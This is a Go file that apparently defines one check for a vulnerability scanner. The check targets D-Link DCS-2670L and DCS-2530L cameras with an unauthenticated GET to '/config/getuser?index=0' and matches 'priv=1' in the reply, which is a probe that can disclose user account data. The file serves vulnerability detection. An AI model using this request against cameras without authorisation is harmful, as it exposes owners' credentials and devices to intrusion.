package poc

func (Info *PocInfo) D_Link_DCS_INFO_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "dlink"
	poc.Info.Type = "INFO"
	poc.Info.Name = "D-Link DCS-2670L and D-Link DCS-2530L INFO"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/config/getuser?index=0"}
	poc.Poc.Param = []string{"index"}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"priv=1"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
